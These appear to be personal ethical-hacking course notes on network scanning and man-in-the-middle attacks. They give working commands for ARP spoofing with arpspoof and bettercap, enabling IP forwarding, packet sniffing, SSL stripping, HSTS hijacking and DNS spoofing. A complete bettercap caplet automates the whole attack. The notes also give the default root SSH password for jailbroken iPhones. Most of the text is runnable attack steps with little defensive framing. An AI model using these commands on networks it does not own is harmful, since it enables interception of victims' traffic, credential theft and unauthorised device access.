

**Network Mapping**
<pre>
To find devices connected and their ip, mac etc
    netdiscover -r 10.0.1.1/24      (1/24 check for 1 to 254)
    q -  to quit.
Nmap/zenmap
zenmap
ping scan,quick scan,quick scan plus (slower)   - gives the os and version of the service
so that we can search the “service name + version” exploit  in the google

<b>NOTE:</b>when iphone is jail broken , it automatically creates service SSH and password : alpine
    ssh root@ipaddress 
    password:alpine
    
    
<b>MITM attack (Man in the middle attack):</b>
being in the middle of the connection ,intercepting and watching the tranferred data
communication between networks is carried out using mac address and not ip adr
Method1: Arp spoofing attack
</pre>



**ARP spoofing:**
<pre>
ARP-Address Resolution Protocol  
In this process, the hacker machine does 2 things
* hacklap telling router this is the IP (pretending to have targlap's IP address)
----router registers this ip and mac address of hacklap
* hacklap telling the targlap this is the IP (pretending to have router's IP address) 
----targlap registers this ip and mac address of hacklap 
ARP spoofing is possible because the clients even accepts response without sending requests and trusts without verification

<b>TOOLS</b>
<b>1.arpspoof</b>
    arp -a      (show ip and mac in arp table)
    arpspoof -i eth0(or)wlan0 -t   target'sIP   router'sIP            (to targetlap)
    arpspoof -i eth0(or)wlan0 -t   router'sIP   target'sIP            (to router)
after this cmd exec, the mac address mapped to the router inside the targlap is changed as hacklap's mac address 
(use arp -a to check)
* Linux defaultly have port-forwarding disabled , must enable port-forwarding for to-from communication
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
<b>2.bettercap</b>
to go into 
    bettercap -iface  eth0(or)wlan0
    >help
    >help net.probe
    >net.probe on    (finds all ip's and mac of all devices connected to eth0/wlan0)
    >net.show    (shows the ip mac table)
    >help arp.spoof       (shows all submodules and params)
    
    
    (attack example)
    >net.probe on
    >set arp.spoof.fullduplex true      (set submodule_name true ,for making any params to true or false)
    >set arp.spoof.targets targetlap'sIP
    >arp.spoof on
    >net.sniff on    (capture and analyze data)
 to stop and come out
    >exit
* bypassing https ,To spoof and snif https , we would convert the https to http and give to target.
When converting Https to Http, set net.sniff.local true    (so that it doesn't feel insecure to show data on screen)
to see predefined caplets,
    >caplets.show
    >hstshijack/hstshijack
* bypassing hsts, some replacing scripts needed.
dns spoofing(redirecting the domain in the targetalp to our running apache server)
    service apache2 start  (run the local server)   and modify the \var\www\html\index.html as your wish
use dnf.spoof inside bettercap 
* setting hstshijack payload, go to \usr\local\share\bettercap\caplets\ in the set\hshstjack\payloads add , after the previous script and add like *:\filename.js    (* for all websites)
* to enter bettercap userinterface , 
    bettercap -iface  eth0(or)wlan0
    >http-ui          (if not installed >ui.update)
    username:user
    password:pass
* use Wireshark for future analysis of the file.cap
 </pre>   
  
  
<pre>
<b>NOTE:</b> use caplets for creating a script
    <b>CAPLET</b>(cmds as txt file )
    open text file and add the commands line by line
        net.probe on
        set arp.spoof.fullduplex true 
        set arp.spoof.targets 2.0.0.7
        arp.spoof on
        set net.sniff.local true
        set net.sniff.output /anylocation/file.cap       (to open in wireshark)
        set https.proxy.sslstrip true
        net.sniff on  
     save in extension filename.cap in /root
    to run caplet in bettercap
        bettercap -iface eth0 -caplet /root/filename.cap


    <b>Http</b> data in http is plain text, Man in the middle can read and edit request,response
    <b>Https</b> data is encrypted using TLS(transport layer security) or SSL (secure sockets layers)

   
   </pre>
    
